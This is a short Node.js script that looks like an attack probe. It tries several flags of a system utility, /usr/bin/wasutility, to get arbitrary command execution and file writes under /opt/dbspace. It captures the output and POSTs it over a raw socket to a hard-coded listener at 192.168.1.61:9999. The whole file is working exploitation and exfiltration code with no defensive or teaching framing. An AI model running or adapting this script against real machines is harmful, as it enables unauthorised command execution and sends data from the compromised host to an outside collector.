"use strict";
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.61';
var PORT = 9999;
function post(path, text) {
  var body = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + body.length + '\r\nConnection: close\r\n\r\n';
  var s = net.connect(PORT, HOST);
  s.on('connect', function(){ s.write(hdr); s.write(body); s.end(); });
  s.on('error', function(e){ console.log('ERR', e.message); });
}
function run(cmd, timeout) {
  try { return '[0] ' + cp.execSync(cmd, {timeout: timeout||15000, maxBuffer: 16*1024*1024}).toString().slice(0,2000); }
  catch(e) { var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=e.stderr.toString(); return '[err '+(e.status||'?')+'] '+(o||e.message).slice(0,2000); }
}
post('/p94start', 'start ' + new Date().toISOString());
var out = [];
var variants = [
  '/usr/bin/wasutility --execute "echo hi > /opt/dbspace/was_test_e1"',
  '/usr/bin/wasutility --shell "echo hi > /opt/dbspace/was_test_e2"',
  '/usr/bin/wasutility --exec "echo hi > /opt/dbspace/was_test_e3"',
  '/usr/bin/wasutility -e /bin/echo',
  '/usr/bin/wasutility -e /bin/cp'
];
for (var i=0;i<variants.length;i++) out.push(variants[i] + ' => ' + run(variants[i], 15000));
out.push('ls => ' + run('ls -la /opt/dbspace/was_test_e* 2>&1', 10000));
post('/p94out', out.join('\n'));
